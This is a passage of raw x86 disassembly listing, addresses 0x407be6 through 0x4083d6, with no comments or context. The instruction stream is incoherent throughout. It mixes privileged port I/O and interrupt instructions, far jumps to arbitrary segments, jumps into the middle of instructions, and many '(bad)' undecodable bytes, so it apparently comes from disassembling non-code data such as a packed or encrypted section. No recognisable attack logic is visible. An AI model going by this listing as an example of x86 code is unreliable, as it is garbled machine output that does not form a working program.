  407be6:	into   
  407be7:	push   esi
  407be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be9:	sbb    al,0xa6
  407beb:	aaa    
  407bec:	jmp    0xb67a:0xc5702a55
  407bf3:	jnp    0x407bb7
  407bf5:	adc    DWORD PTR [ebp+ebp*1+0x3d8f44e],0xffffffc3
  407bfd:	sti    
  407bfe:	je     0x407c26
  407c00:	mov    edx,0x14dd03fa
  407c05:	mov    ds:0x3463ce28,eax
  407c0a:	addr16 xor eax,0x1a27a20
  407c10:	or     esp,DWORD PTR [edi+0x521d976a]
  407c16:	aas    
  407c17:	ja     0x407c44
  407c19:	pop    edi
  407c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c1b:	je     0x407c3b
  407c1d:	mov    dh,0x21
  407c1f:	pusha  
  407c20:	and    al,0xa5
  407c22:	mov    ecx,DWORD PTR [ebp+0xf]
  407c25:	inc    ebx
  407c26:	mov    esi,0x3f994e47
  407c2b:	loop   0x407c78
  407c2d:	scas   eax,DWORD PTR es:[edi]
  407c2e:	pop    esp
  407c2f:	mov    ebx,0x2ee033dc
  407c34:	sti    
  407c35:	push   ss
  407c36:	jo     0x407bde
  407c38:	out    dx,al
  407c39:	inc    ecx
  407c3a:	lock or DWORD PTR [edx],esi
  407c3d:	mov    ebp,0xe937e6ba
  407c42:	gs jg  0x407cc4
  407c45:	mov    al,0x9
  407c47:	popf   
  407c48:	arpl   WORD PTR [esp+edx*8-0x6e594541],ax
  407c4f:	push   es
  407c50:	add    ecx,DWORD PTR [bp+si+0x7f]
  407c54:	xchg   ebx,eax
  407c55:	sub    eax,0x4652ca69
  407c5a:	xor    DWORD PTR [edi],esp
  407c5c:	test   al,0x45
  407c5e:	test   DWORD PTR [ebx+0x37253816],eax
  407c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c65:	dec    eax
  407c66:	in     eax,0xdb
  407c68:	push   ebx
  407c69:	js     0x407c61
  407c6b:	lea    edx,[ebp-0xb]
  407c6e:	ret    0x722b
  407c71:	jg     0x407c64
  407c73:	jno    0x407c19
  407c75:	and    eax,0x8d2eb3b5
  407c7a:	mov    ebp,0x2fc856c
  407c7f:	int3   
  407c80:	jb     0x407ced
  407c82:	sahf   
  407c83:	mov    DWORD PTR [ebp-0x5ae1047c],edi
  407c89:	fistp  QWORD PTR ds:0x10b489cb
  407c8f:	in     eax,0x80
  407c91:	push   eax
  407c92:	jnp    0x407cd6
  407c94:	dec    esi
  407c95:	cli    
  407c96:	add    BYTE PTR [ecx-0x7a],ch
  407c99:	fs retf 0x954f
  407c9d:	pop    ss
  407c9e:	pop    eax
  407c9f:	lods   al,BYTE PTR ss:[esi]
  407ca1:	ins    BYTE PTR es:[edi],dx
  407ca2:	mov    edi,0xfcc22bb1
  407ca7:	fmul   st(4),st
  407ca9:	div    DWORD PTR [ecx-0x23fe7fa9]
  407caf:	push   ss
  407cb0:	inc    edx
  407cb1:	adc    al,0xbb
  407cb3:	scas   al,BYTE PTR es:[edi]
  407cb4:	arpl   ax,sp
  407cb6:	push   ebx
  407cb7:	jmp    0x407d32
  407cb9:	cwde   
  407cba:	mov    WORD PTR [eax+ebx*1-0x5fda8e9],cs
  407cc1:	dec    ebx
  407cc2:	ins    DWORD PTR es:[edi],dx
  407cc3:	push   0x7466447a
  407cc8:	mov    edi,0x1115a99b
  407ccd:	sub    eax,0xb643277b
  407cd2:	inc    esp
  407cd3:	sub    al,0x0
  407cd5:	or     eax,edx
  407cd7:	xor    bh,bl
  407cd9:	mov    eax,ds:0x7e70df3c
  407cde:	cmp    eax,DWORD PTR [edi+0x1ed50942]
  407ce4:	or     cl,BYTE PTR [ecx+0x31]
  407ce7:	add    esp,0x4
  407cea:	xchg   edi,eax
  407ceb:	push   esi
  407ced:	jmp    DWORD PTR [eax]
  407cef:	div    BYTE PTR [eax+eiz*2-0x48]
  407cf3:	mov    bl,0x7e
  407cf5:	dec    edx
  407cf6:	int    0x9b
  407cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cf9:	iret   
  407cfa:	shl    BYTE PTR [edx],cl
  407cfc:	pop    eax
  407cfd:	hlt    
  407cfe:	mov    DWORD PTR [ecx+0x69],ebx
  407d01:	mov    edi,0x17a7f84
  407d06:	mul    BYTE PTR [edi-0x446a4788]
  407d0c:	aaa    
  407d0d:	nop
  407d0e:	push   ebx
  407d0f:	in     eax,0xc9
  407d11:	dec    eax
  407d12:	jbe    0x407d32
  407d14:	push   es
  407d15:	mov    ds:0xb338fdd5,eax
  407d1a:	mov    cs,WORD PTR ds:0xf94d6768
  407d20:	fwait
  407d21:	pop    esp
  407d22:	sub    DWORD PTR [ebp+0x5a550f3c],edx
  407d28:	test   al,0xe9
  407d2a:	mov    eax,ds:0xa7ac50df
  407d2f:	inc    esi
  407d30:	mov    bh,0xcc
  407d32:	mov    ah,0x96
  407d34:	jae    0x407d8b
  407d36:	pop    ds
  407d37:	pop    esi
  407d38:	test   al,0xa0
  407d3a:	fcomp  DWORD PTR [edi]
  407d3c:	out    dx,al
  407d3d:	fs pop edi
  407d3f:	xchg   esi,eax
  407d40:	adc    eax,0xb12b2797
  407d45:	(bad)  
  407d46:	aam    0x22
  407d48:	cdq    
  407d49:	dec    edx
  407d4a:	sbb    dh,ah
  407d4c:	dec    ebp
  407d4d:	jnp    0x407d04
  407d4f:	call   FWORD PTR [ebx+0x24624bea]
  407d55:	sbb    BYTE PTR [edx+0x5bdc797d],bh
  407d5b:	sar    DWORD PTR [ebx],0x25
  407d5e:	mov    ecx,DWORD PTR [ebx-0x5525cd62]
  407d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d65:	inc    eax
  407d66:	out    dx,al
  407d67:	or     eax,0x48b1df3d
  407d6c:	or     al,0xa4
  407d6e:	cwde   
  407d6f:	jo     0x407d77
  407d71:	pop    ebp
  407d72:	jnp    0x407d71
  407d74:	mov    bh,0xd9
  407d76:	ins    BYTE PTR es:[di],dx
  407d78:	neg    DWORD PTR [ebp+0x20]
  407d7b:	inc    edi
  407d7c:	mov    cs,WORD PTR [ebx]
  407d7e:	push   ebp
  407d7f:	sar    DWORD PTR [ebx+eiz*4-0x20],0xe6
  407d84:	hlt    
  407d85:	mov    edi,0x89ad7b5b
  407d8a:	inc    eax
  407d8b:	aam    0xd5
  407d8d:	cmp    BYTE PTR [ecx],bl
  407d8f:	pop    ecx
  407d90:	call   0x7b3:0x3ef24f87
  407d97:	test   eax,0x1d2818a5
  407d9c:	push   es
  407d9d:	or     eax,0x15e19b86
  407da2:	sar    BYTE PTR [eax-0x40b449b9],0xf9
  407da9:	popf   
  407daa:	stc    
  407dab:	add    al,0x1c
  407dad:	lock jle 0x407d48
  407db0:	jp     0x407d38
  407db2:	lds    edi,FWORD PTR [ebp+0x23ae9b9e]
  407db8:	mov    al,ds:0x6816ab1e
  407dbd:	scas   eax,DWORD PTR es:[edi]
  407dbe:	das    
  407dbf:	ss dec eax
  407dc1:	push   0x776c03d6
  407dc6:	or     eax,0x99a3b9bd
  407dcb:	cli    
  407dcc:	mov    dh,0xcd
  407dce:	jle    0x407dde
  407dd0:	add    esi,DWORD PTR [edi]
  407dd2:	mov    WORD PTR [esi+eax*2],es
  407dd5:	dec    eax
  407dd6:	pop    ss
  407dd7:	mov    bl,0xf4
  407dd9:	pop    ebp
  407dda:	mov    edx,0x6d8581fb
  407ddf:	mov    esi,0x154eb8ff
  407de4:	outs   dx,BYTE PTR ds:[esi]
  407de5:	(bad)  
  407de6:	(bad)  
  407de7:	mov    eax,0xff3129b0
  407dec:	adc    DWORD PTR [eax],edx
  407dee:	lods   al,BYTE PTR ds:[esi]
  407def:	mov    ds:0x8eb9989d,eax
  407df4:	sbb    al,0x42
  407df6:	sahf   
  407df7:	add    eax,0xe5f98d6f
  407dfc:	int3   
  407dfd:	loope  0x407df8
  407dff:	pusha  
  407e00:	mov    ecx,0x9b116df5
  407e05:	scas   eax,DWORD PTR es:[edi]
  407e06:	ss jbe 0x407e84
  407e09:	push   ecx
  407e0a:	aas    
  407e0b:	stos   BYTE PTR es:[edi],al
  407e0c:	dec    edx
  407e0d:	xchg   edi,eax
  407e0e:	push   edx
  407e0f:	out    0x86,eax
  407e11:	xchg   al,cl
  407e13:	sti    
  407e14:	xor    dh,cl
  407e16:	sbb    ecx,DWORD PTR [ebx+0x21]
  407e19:	jecxz  0x407dc0
  407e1b:	mov    ebp,0x2a0bb38f
  407e20:	mov    ebx,0xb33d961d
  407e25:	out    0xc7,al
  407e27:	cmp    ebx,DWORD PTR [ebp-0x1e]
  407e2a:	out    0x2f,eax
  407e2c:	or     BYTE PTR [esp+edx*8+0x32749236],ah
  407e33:	inc    edi
  407e34:	jo     0x407e37
  407e36:	test   cl,0xe8
  407e39:	daa    
  407e3a:	ret    0xcdc0
  407e3d:	pop    ss
  407e3e:	dec    ecx
  407e3f:	and    al,0xab
  407e41:	sbb    DWORD PTR [bx+si+0x2c86],0x54
  407e47:	jmp    0x407ea2
  407e49:	mov    DWORD PTR [edi+0x1c],edi
  407e4c:	sbb    al,0xe8
  407e4e:	add    bh,0xa9
  407e51:	fistp  WORD PTR [eax*8-0x7ee27c28]
  407e58:	add    ebp,edx
  407e5a:	jns    0xd6861ccd
  407e60:	jmp    0x2ba4:0x73c96e98
  407e67:	xchg   ecx,eax
  407e68:	dec    esp
  407e69:	sti    
  407e6a:	adc    al,BYTE PTR [ebx+0x40d8b1d5]
  407e70:	jb     0x407e3f
  407e72:	push   ecx
  407e73:	(bad)  
  407e74:	mov    ch,0x9a
  407e76:	ja     0x407e27
  407e78:	daa    
  407e79:	aaa    
  407e7a:	ins    BYTE PTR es:[edi],dx
  407e7b:	jns    0x407e1a
  407e7d:	out    dx,eax
  407e7e:	or     cl,BYTE PTR [ebx-0x55647317]
  407e84:	add    eax,0xa964286b
  407e89:	or     eax,DWORD PTR ds:0x18b52180
  407e8f:	xor    eax,DWORD PTR [edx]
  407e91:	sbb    DWORD PTR [edx-0x27d39967],ebp
  407e97:	ja     0x407e6f
  407e99:	xor    eax,0x43ca87a6
  407e9e:	(bad)  
  407e9f:	mov    ds:0xe03fc42c,eax
  407ea4:	jl     0x407e5e
  407ea6:	lahf   
  407ea7:	xchg   ecx,eax
  407ea8:	xor    eax,0xb6a779d7
  407ead:	sub    BYTE PTR [ecx-0xfe6989],ch
  407eb3:	sub    eax,0x8a9e6827
  407eb8:	dec    ebp
  407eb9:	mov    bl,BYTE PTR [esi+0x7f4f5bcb]
  407ebf:	pop    es
  407ec0:	xlat   BYTE PTR ds:[ebx]
  407ec1:	sub    bl,BYTE PTR [edi]
  407ec3:	or     ecx,DWORD PTR [edx+0x23]
  407ec6:	sbb    al,0x83
  407ec8:	adc    eax,0x990a7e3d
  407ecd:	jecxz  0x407e61
  407ecf:	fld    TBYTE PTR [esp+ebp*2-0x18e46ea2]
  407ed6:	push   ebp
  407ed7:	cli    
  407ed8:	pusha  
  407ed9:	(bad)  
  407edb:	out    dx,al
  407edc:	mov    cl,0x44
  407ede:	cli    
  407edf:	xchg   edi,eax
  407ee0:	xor    DWORD PTR [edx+0x6d75ae1a],eax
  407ee6:	scas   al,BYTE PTR es:[edi]
  407ee7:	int    0x16
  407ee9:	int    0x91
  407eeb:	mov    dh,0x4e
  407eed:	xor    edx,DWORD PTR [ebx+0x4a]
  407ef0:	push   ds
  407ef1:	xor    bh,BYTE PTR [ebp-0x5b]
  407ef4:	mov    bh,0xcb
  407ef6:	jmp    FWORD PTR ds:0x487e38b
  407efc:	jmp    0x407f62
  407efe:	es int3 
  407f00:	scas   eax,DWORD PTR es:[edi]
  407f01:	cmp    eax,0x9ac8f3d2
  407f06:	dec    esi
  407f07:	aam    0x6b
  407f09:	mov    esp,0x4624f78e
  407f0e:	push   ss
  407f0f:	inc    ecx
  407f10:	jge    0x407efa
  407f12:	ins    BYTE PTR es:[edi],dx
  407f13:	inc    esi
  407f14:	cmp    al,0x3d
  407f16:	or     cl,0x96
  407f19:	into   
  407f1a:	rol    BYTE PTR [ebx+0xf0306a9],0x7b
  407f21:	sar    DWORD PTR [esi],1
  407f23:	mov    dh,0x2d
  407f25:	inc    edi
  407f26:	inc    ebp
  407f27:	mov    dh,0x56
  407f29:	jbe    0x407f31
  407f2b:	(bad)  
  407f2c:	cdq    
  407f2d:	fwait
  407f2e:	adc    DWORD PTR [ecx+0x1d3168c6],ebx
  407f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f35:	pop    ss
  407f36:	loopne 0x407f8d
  407f38:	arpl   WORD PTR fs:[edx+esi*1],cx
  407f3c:	mov    bl,0xdd
  407f3e:	push   ebx
  407f3f:	and    eax,DWORD PTR [edi-0x11]
  407f42:	xor    esi,DWORD PTR [ecx-0x3512051b]
  407f48:	push   edi
  407f49:	sahf   
  407f4a:	add    eax,0x940a2f28
  407f4f:	in     eax,0xe7
  407f51:	sbb    BYTE PTR [ebx-0x280b310e],cl
  407f57:	cs adc al,0xe3
  407f5a:	call   DWORD PTR [ebp+0x7]
  407f5d:	js     0x407efa
  407f5f:	cli    
  407f60:	lods   al,BYTE PTR ds:[esi]
  407f61:	lods   al,BYTE PTR ds:[esi]
  407f62:	ins    BYTE PTR es:[edi],dx
  407f63:	cmc    
  407f64:	add    DWORD PTR [edx],ecx
  407f66:	xor    dh,BYTE PTR [eax+0x71]
  407f69:	xlat   BYTE PTR ds:[ebx]
  407f6a:	popa   
  407f6b:	and    al,0xc3
  407f6d:	xchg   BYTE PTR [esi-0x7b],dl
  407f70:	xchg   BYTE PTR [edx+0x2],cl
  407f73:	data16 jp 0x407f56
  407f76:	dec    ebp
  407f77:	mov    eax,0x39f5a0ff
  407f7c:	ds dec edi
  407f7e:	(bad)  
  407f80:	xlat   BYTE PTR ds:[ebx]
  407f81:	data16 (bad) 
  407f83:	sbb    al,0x9b
  407f85:	shl    DWORD PTR [edi+0x48],cl
  407f88:	pop    ebp
  407f89:	push   0x78
  407f8b:	sbb    bh,BYTE PTR [esi+ebx*1+0x18938d9c]
  407f92:	push   es
  407f93:	enter  0xdfde,0xa8
  407f97:	sahf   
  407f98:	mov    ch,0xb6
  407f9a:	nop
  407f9b:	(bad)  
  407f9c:	lods   eax,DWORD PTR ds:[esi]
  407f9d:	out    0x43,eax
  407f9f:	mov    ds:0xa74c2577,eax
  407fa4:	test   BYTE PTR [ebp+ebx*8-0x6779a0d],ch
  407fab:	push   ebx
  407fac:	sub    ebx,ebx
  407fae:	cvttps2pi mm6,QWORD PTR [esi]
  407fb1:	call   0x56fb:0x357e9164
  407fb8:	push   ebp
  407fb9:	mov    edi,0xbb1ae819
  407fbe:	test   BYTE PTR [ebx+ecx*8-0x6b],bh
  407fc2:	outs   dx,BYTE PTR ds:[esi]
  407fc3:	das    
  407fc4:	pop    esp
  407fc5:	data16 jns 0x407fba
  407fc8:	add    ch,BYTE PTR [esp+eax*1]
  407fcb:	scas   eax,DWORD PTR es:[edi]
  407fcc:	sbb    al,BYTE PTR [edx+0x56eeb364]
  407fd2:	popa   
  407fd3:	add    al,0x22
  407fd5:	(bad)  
  407fd6:	mov    ch,0x47
  407fd8:	or     al,0x3a
  407fda:	jecxz  0x408056
  407fdc:	dec    edi
  407fdd:	in     eax,0x4b
  407fdf:	or     DWORD PTR [esp+edi*8-0x6d],0xd97b8475
  407fe7:	dec    ebp
  407fe8:	mov    bl,0xc9
  407fea:	test   ecx,eax
  407fec:	test   DWORD PTR [eax-0x68],esp
  407fef:	and    dl,BYTE PTR [ecx-0x24e5a793]
  407ff5:	add    ebp,DWORD PTR [eax+0x1f]
  407ff8:	(bad)  
  407ff9:	nop
  407ffa:	call   0xfe3ceb73
  407fff:	enter  0xdd49,0xa9
  408003:	add    DWORD PTR [edx+0x726d8be3],ebx
  408009:	inc    esi
  40800a:	(bad)  
  40800b:	mov    esi,0xd15f5912
  408010:	retf   0x4566
  408013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408014:	mov    esi,0xc0bd83db
  408019:	mov    ebp,0x53ece752
  40801e:	sbb    al,0x6
  408020:	pop    edx
  408021:	sub    dl,BYTE PTR [ebx]
  408023:	fnstenv [edx-0x1d998d3b]
  408029:	or     bl,al
  40802b:	add    bl,BYTE PTR [ecx-0x18eacac]
  408031:	fistp  WORD PTR [esi]
  408033:	sbb    eax,0xef76e7e4
  408038:	or     dl,dl
  40803a:	jmp    0x90248a55
  40803f:	jnp    0x407ff3
  408041:	dec    edi
  408042:	je     0x4080ad
  408044:	xchg   ebx,eax
  408045:	xchg   ebx,eax
  408046:	or     eax,0x81d25f70
  40804b:	mov    edi,0x9aa81ca9
  408050:	inc    ebp
  408051:	bound  esi,QWORD PTR [ebx]
  408053:	inc    BYTE PTR [edx-0x89dea4e]
  408059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40805a:	aas    
  40805b:	jl     0x40809f
  40805d:	(bad)  
  40805f:	jl     0x408092
  408061:	lea    ebp,[ecx]
  408063:	add    esi,DWORD PTR [ecx]
  408065:	(bad)  
  408067:	por    mm3,QWORD PTR [eax-0x2e]
  40806b:	sti    
  40806c:	jno    0x408020
  40806e:	dec    eax
  40806f:	nop
  408070:	mov    ds:0x8f85a630,eax
  408075:	ds in  eax,dx
  408077:	jge    0x4080cb
  408079:	sub    eax,0xb5eba718
  40807e:	ja     0x4080b1
  408080:	sub    bl,BYTE PTR [eax+edx*8]
  408083:	test   BYTE PTR ds:0x3f1c69c2,0xb5
  40808a:	pop    edx
  40808b:	xor    dl,BYTE PTR [edx]
  40808d:	popf   
  40808e:	inc    ebx
  40808f:	mov    eax,ds:0xa6cfbeb4
  408094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408095:	inc    esp
  408096:	test   eax,0x57977519
  40809b:	mov    ebp,0xb5b497fe
  4080a0:	fisub  DWORD PTR [eax-0x2f]
  4080a3:	fsubr  QWORD PTR [edx+0x6a84a68a]
  4080a9:	arpl   WORD PTR [ebx],sp
  4080ab:	fiadd  WORD PTR [ebx]
  4080ad:	mov    edx,0x27660114
  4080b2:	push   0x27
  4080b4:	xchg   DWORD PTR [eax+edi*8-0x2f],ecx
  4080b8:	mov    ch,0xfc
  4080ba:	xor    DWORD PTR [edx+0x30cabc6c],0xc71ab001
  4080c4:	mov    eax,ds:0x422095e
  4080c9:	out    0xc9,al
  4080cb:	pop    ecx
  4080cc:	mov    esi,ecx
  4080ce:	scas   eax,DWORD PTR es:[edi]
  4080cf:	sbb    al,0x2e
  4080d1:	out    dx,al
  4080d2:	shl    ecx,1
  4080d4:	lahf   
  4080d5:	fisubr DWORD PTR [ecx]
  4080d7:	and    eax,0xcc5abc72
  4080dc:	xchg   BYTE PTR [ebx+ecx*4+0x4156148],ch
  4080e3:	dec    edi
  4080e4:	dec    esp
  4080e5:	test   al,0x62
  4080e7:	bound  ebx,QWORD PTR [edx+0x29]
  4080ea:	xchg   esp,eax
  4080eb:	pop    esp
  4080ec:	xor    ebp,DWORD PTR [eax+edx*1+0x4d]
  4080f0:	ds mov dl,0x8b
  4080f3:	xchg   edi,eax
  4080f4:	retf   0x67a1
  4080f7:	mov    BYTE PTR ds:0xa03eb918,0x66
  4080fe:	push   0xffffff8a
  408100:	pusha  
  408101:	jmp    0xf6d1:0x91e3bf3d
  408108:	cdq    
  408109:	pop    ss
  40810a:	out    dx,eax
  40810b:	mov    ebp,DWORD PTR [edx-0x54]
  40810e:	and    DWORD PTR [eax-0x5d],esp
  408111:	add    cl,BYTE PTR [edi-0x70f9207e]
  408117:	jmp    FWORD PTR [eax+0x78bd6d76]
  40811d:	imul   esi,DWORD PTR [ebx+0x74],0x69
  408121:	mov    ebx,0x8911e059
  408126:	or     al,0x65
  408128:	cmp    DWORD PTR [edi],ebx
  40812a:	call   0x800841dd
  40812f:	aaa    
  408130:	pushf  
  408131:	cmp    al,0xb3
  408133:	sub    bh,bl
  408135:	cmp    eax,0x6903024a
  40813a:	and    BYTE PTR [esi],dl
  40813c:	mov    WORD PTR [ebx+0x2f],?
  40813f:	xlat   BYTE PTR ds:[ebx]
  408140:	shr    BYTE PTR [edx-0x6ff83c78],0x7e
  408147:	dec    eax
  408148:	xor    BYTE PTR [edi-0x69c5a3eb],bh
  40814e:	(bad)  
  40814f:	xchg   edi,eax
  408150:	inc    ebx
  408151:	and    eax,0x5028cf5c
  408156:	mov    fs,WORD PTR [eax]
  408158:	pop    edx
  408159:	pop    es
  40815a:	pop    ebx
  40815b:	inc    esi
  40815c:	shl    DWORD PTR ds:0x29e49859,0x9c
  408163:	or     ah,ch
  408165:	and    al,0x21
  408167:	xor    ebp,DWORD PTR [edx]
  408169:	fdiv   QWORD PTR [edi]
  40816b:	pusha  
  40816c:	adc    al,0x53
  40816e:	scas   al,BYTE PTR es:[edi]
  40816f:	(bad)  
  408171:	in     eax,dx
  408172:	std    
  408173:	retf   0xc270
  408176:	push   edx
  408177:	addr16 call 0x7751ffdb
  40817d:	aas    
  40817e:	xor    BYTE PTR [ebx+edx*4+0x2dd1a60],dl
  408185:	rcl    cl,cl
  408187:	or     BYTE PTR [edx-0x673c1ecb],bl
  40818d:	data16 fidiv DWORD PTR [ebx+0x3e9d52f]
  408194:	rcr    DWORD PTR [esi+0x3b09c82],0xb2
  40819b:	dec    ecx
  40819c:	cs in  eax,dx
  40819e:	xchg   ecx,eax
  40819f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a0:	adc    eax,0x65fedf00
  4081a5:	cmp    eax,0x8a2ad71
  4081aa:	pop    edi
  4081ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081ac:	lods   al,BYTE PTR ds:[esi]
  4081ad:	push   eax
  4081ae:	cwde   
  4081af:	pop    ebp
  4081b0:	and    al,0x34
  4081b2:	push   ds
  4081b3:	sbb    eax,0x23916305
  4081b8:	xchg   DWORD PTR [edi],ebx
  4081ba:	imul   ebx,DWORD PTR [edi-0x64276c6],0x3755a76e
  4081c4:	or     eax,0xe8358df
  4081c9:	xchg   esp,eax
  4081ca:	sti    
  4081cb:	pushf  
  4081cc:	adc    esp,DWORD PTR [esi-0x33]
  4081cf:	or     al,BYTE PTR [edx]
  4081d1:	pop    ds
  4081d2:	adc    BYTE PTR [edx+0x2],cl
  4081d5:	xchg   esp,eax
  4081d6:	bound  ecx,QWORD PTR [edx-0x51]
  4081d9:	adc    eax,0x4561c936
  4081de:	and    dl,bl
  4081e0:	cmp    eax,0xf59a1e3c
  4081e5:	push   edi
  4081e6:	and    BYTE PTR [eax+ebp*2-0x591cc924],0x53
  4081ee:	push   ebx
  4081ef:	ficomp WORD PTR ss:[ebp+0x5e]
  4081f3:	sti    
  4081f4:	repnz clc 
  4081f6:	inc    ecx
  4081f7:	jns    0x408224
  4081f9:	add    DWORD PTR [ebx],0x3a273107
  4081ff:	xchg   edi,eax
  408200:	arpl   sp,bx
  408202:	jle    0x408239
  408204:	enter  0x1618,0xb5
  408208:	arpl   bx,sp
  40820a:	iret   
  40820b:	xchg   BYTE PTR [edi-0x45],dl
  40820e:	(bad)  
  40820f:	aad    0xcb
  408211:	inc    ebp
  408212:	(bad)  
  408213:	mov    edi,0xa22b168f
  408218:	sub    eax,0x9cd7b0a
  40821d:	push   0xffffffea
  40821f:	cmp    bl,BYTE PTR [edx+0x24350077]
  408225:	(bad)  [eax]
  408227:	psubq  mm0,mm5
  40822a:	clc    
  40822b:	js     0x40826e
  40822d:	mov    eax,ds:0xa5a020f2
  408232:	repz push ds
  408234:	pop    ebx
  408235:	imul   edi,DWORD PTR [eax-0x94727e5],0xf7287e3d
  40823f:	xchg   DWORD PTR [esi-0x3a01f4c3],ebp
  408245:	fld    TBYTE PTR [edx]
  408247:	sbb    ebx,DWORD PTR ds:0x5aec7ac5
  40824d:	xchg   esp,eax
  40824e:	stos   BYTE PTR es:[edi],al
  40824f:	loopne 0x40822c
  408251:	rcl    DWORD PTR [ecx],1
  408253:	push   esi
  408254:	adc    DWORD PTR [edi-0x9],ebp
  408257:	shl    DWORD PTR [eax],1
  408259:	mov    DWORD PTR [edx],ebx
  40825b:	mov    ss,WORD PTR [esi+0x297bf7a9]
  408261:	int    0x58
  408263:	rol    BYTE PTR [ecx-0x338856f7],1
  408269:	xlat   BYTE PTR ds:[ebx]
  40826a:	mov    ds:0x837c0c24,eax
  40826f:	aas    
  408270:	xchg   ebp,eax
  408271:	xor    BYTE PTR [ebp+0x4d],bl
  408274:	adc    BYTE PTR [edi-0x7],ah
  408277:	les    ebp,FWORD PTR [ebx+0x19]
  40827a:	jnp    0x40828e
  40827c:	scas   al,BYTE PTR es:[edi]
  40827d:	vpunpcklqdq ymm4,ymm5,YMMWORD PTR [ebx]
  408281:	or     eax,0x69d60ffc
  408286:	mov    ebp,0xac49abc7
  40828b:	mov    eax,DWORD PTR [ebx-0x25]
  40828e:	adc    bl,ah
  408290:	sbb    ah,BYTE PTR [ecx-0x6a]
  408293:	mov    ds:0xaaa2274c,eax
  408298:	sub    BYTE PTR [ebx-0x320a9b8a],dl
  40829e:	xor    eax,0x2438c0a5
  4082a3:	cld    
  4082a4:	jg     0x408306
  4082a6:	addr16 mov eax,ds:0xec61
  4082aa:	mov    ds:0xd44eb4ef,al
  4082af:	push   edx
  4082b1:	and    al,0x85
  4082b3:	popa   
  4082b4:	sub    dl,0x39
  4082b7:	aam    0xeb
  4082b9:	pushfw 
  4082bb:	xchg   edi,eax
  4082bc:	pop    ecx
  4082bd:	sbb    eax,0xe2231d64
  4082c2:	fisttp DWORD PTR [ebx+eax*2-0x59]
  4082c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c7:	push   edx
  4082c8:	stos   DWORD PTR es:[edi],eax
  4082c9:	mov    dh,BYTE PTR [ebp-0x12]
  4082cc:	sahf   
  4082cd:	pop    eax
  4082ce:	xchg   edi,eax
  4082cf:	test   BYTE PTR [esi],dh
  4082d1:	ins    DWORD PTR es:[edi],dx
  4082d2:	sar    DWORD PTR [ebx-0x75dde0b7],0x65
  4082d9:	xchg   ebp,eax
  4082da:	loopne 0x408312
  4082dc:	jecxz  0x40829a
  4082de:	sti    
  4082df:	in     al,0x10
  4082e1:	(bad)  
  4082e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e3:	int3   
  4082e4:	inc    edi
  4082e5:	sub    al,0x9b
  4082e7:	mov    al,ds:0xe351d9f6
  4082ec:	inc    edx
  4082ed:	repz cli 
  4082ef:	push   ebx
  4082f0:	xor    dh,BYTE PTR [edi-0x2d]
  4082f3:	lea    ecx,[esi-0x12]
  4082f6:	jecxz  0x4082e2
  4082f8:	dec    esp
  4082f9:	mov    eax,0xb522c030
  4082fe:	adc    eax,ecx
  408300:	push   ss
  408301:	shl    BYTE PTR [ebp-0x126c5667],cl
  408307:	jp     0x40834d
  408309:	jmp    0x4312cd05
  40830e:	pop    ebp
  40830f:	out    0x8a,al
  408311:	in     al,dx
  408312:	jnp    0x40830e
  408314:	test   eax,0xf1b7e3cd
  408319:	stc    
  40831a:	imul   ebx,DWORD PTR [edi+0x54a676ce],0x254e4aab
  408324:	xchg   esi,eax
  408325:	dec    eax
  408326:	mov    esp,DWORD PTR [esi]
  408328:	xchg   ebp,eax
  408329:	sub    dh,BYTE PTR [edi]
  40832b:	adc    al,0x32
  40832d:	ja     0x4083a9
  40832f:	out    0x59,al
  408331:	mov    dl,0xe
  408333:	rcl    DWORD PTR [eax+0x3f6d1aee],0xa6
  40833a:	and    al,0x63
  40833c:	cmp    eax,DWORD PTR ds:[ebx-0x4e577b91]
  408343:	in     al,dx
  408344:	fimul  WORD PTR [ebp-0x2]
  408347:	test   eax,0x216b04a
  40834c:	pop    esp
  40834d:	stc    
  40834e:	push   edi
  40834f:	cwde   
  408350:	dec    DWORD PTR [ebx]
  408352:	push   ss
  408353:	mov    esp,0x9a003f1b
  408358:	push   0x4582ce9
  40835d:	mov    ds:0x1c35afd9,eax
  408362:	sti    
  408363:	hlt    
  408364:	xchg   BYTE PTR [edi+eax*2],ah
  408367:	stos   BYTE PTR es:[edi],al
  408368:	stc    
  408369:	push   cs
  40836a:	retf   0x83d2
  40836d:	repz mov edx,0xd25734d0
  408373:	and    DWORD PTR [ebp+0x1e],esp
  408376:	mov    bh,0x84
  408378:	or     bl,BYTE PTR [edx+0x62]
  40837b:	pop    ds
  40837c:	mov    BYTE PTR [edx-0x17],dh
  40837f:	add    eax,0xdba8c797
  408384:	into   
  408385:	jns    0x4083ea
  408387:	cwde   
  408388:	xor    BYTE PTR [ebx-0x31],dl
  40838b:	pushf  
  40838c:	test   BYTE PTR [esi+eiz*8],cl
  40838f:	or     cl,dh
  408391:	shl    DWORD PTR [esp+edi*4+0x29],0x1d
  408396:	and    al,0x52
  408398:	popf   
  408399:	pop    eax
  40839a:	mov    ebp,0x73a45e89
  40839f:	mov    BYTE PTR [edi],0x17
  4083a2:	fwait
  4083a3:	xchg   esi,eax
  4083a4:	in     eax,0x8
  4083a6:	test   esp,ebp
  4083a8:	jge    0x408396
  4083aa:	pop    ebx
  4083ab:	mov    ebx,0x483a6e0d
  4083b0:	mov    ecx,0x609fc2ee
  4083b5:	test   BYTE PTR [eax-0x6fb6f170],0xce
  4083bc:	daa    
  4083bd:	retf   0x8885
  4083c0:	shr    DWORD PTR [ebp+eax*1+0x5a],0x7e
  4083c5:	mov    bh,0xaf
  4083c7:	imul   ebx,DWORD PTR [edx+0x71983ef6],0xffffffe0
  4083ce:	mov    dh,0x8b
  4083d0:	loop   0x4083b7
  4083d2:	xor    DWORD PTR [ecx-0x1e],0x13
  4083d6:	les    edi,FWORD PTR [esi+0xb119fcb]
